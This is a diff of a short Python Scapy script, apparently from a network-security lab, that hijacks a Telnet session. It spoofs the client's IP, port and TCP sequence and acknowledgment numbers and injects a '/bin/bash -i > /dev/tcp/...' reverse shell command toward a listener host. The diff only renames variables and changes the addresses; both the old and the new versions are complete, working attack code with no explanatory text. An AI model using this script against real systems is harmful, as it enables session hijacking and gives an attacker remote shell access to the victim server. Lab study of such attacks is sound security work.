@@ -1,23 +1,23 @@
 #!/usr/bin/env python3
 from scapy.all import *
 
-# IP and port details
-target_ip = "192.168.10.134"     # Server (VM2)
-target_port = 23                 # Telnet port
-source_ip = "192.168.10.132"     # Client (VM1)
-source_port = 1024               # Change based on captured Telnet src port
+# Define communication endpoints
+victim_server = "192.168.2.52"      # Destination: Server (VM2)
+telnet_port = 23                      # Standard Telnet port
+legit_client = "192.168.2.51"       # Source: Client (VM1)
+client_port = 52662                  # Match this with sniffed client port
 
-# Replace these with values captured from Wireshark
-seq_num = 2000500                # Latest sequence number from Client to Server
-ack_num = 1056700                # Latest acknowledgment number from Server to Client
+# TCP stream details captured during analysis
+client_seq = 1000                  # Sequence number used by client
+server_ack = 135                 # Acknowledgment from server
 
-# Payload: Reverse shell command
-payload = "/bin/bash -i > /dev/tcp/192.168.25.135/9090 0<&1 2>&1\n"
+# Injected reverse shell command
+reverse_cmd = "/bin/bash -i > /dev/tcp/192.168.2.53/9090 0<&1 2>&1\n"
 
-# Craft malicious packet
-ip = IP(src=source_ip, dst=target_ip)
-tcp = TCP(sport=source_port, dport=target_port, seq=seq_num, ack=ack_num, flags="PA")
-pkt = ip/tcp/payload
+# Construct packet with spoofed session data
+ip_hdr = IP(src=legit_client, dst=victim_server)
+tcp_hdr = TCP(sport=client_port, dport=telnet_port, seq=client_seq, ack=server_ack, flags="PA")
+crafted_packet = ip_hdr / tcp_hdr / reverse_cmd
 
-# Send the packet
-send(pkt, verbose=0)
+# Transmit malicious packet into the stream
+send(crafted_packet, verbose=False)
